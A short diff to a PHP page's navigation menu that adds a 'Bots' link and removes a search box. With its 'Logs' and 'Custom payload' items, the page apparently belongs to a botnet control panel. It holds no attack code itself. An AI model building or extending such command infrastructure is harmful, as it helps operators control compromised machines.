@@ -17,16 +17,11 @@ if(isset($_POST['create']))
 ?>
 <div class="panel">
     <div class="ui pointing menu">
+      <a href="index.php?action=bots" class="item">Bots</a>
       <a href="index.php?action=panel" class="item">Logs</a>
       <a href="index.php?action=payload" class="active item">Custom payload</a>
       <a href="logout.php" class="item">Logout</a>
       <div class="right menu">
-        <div class="item">
-          <div class="ui transparent icon input">
-            <input type="text" placeholder="Search...">
-            <i class="fa fa-search"></i>
-          </div>
-        </div>
         <a class="item">Welcome <?php echo $_SESSION['username']; ?></a>
       </div>
     </div>
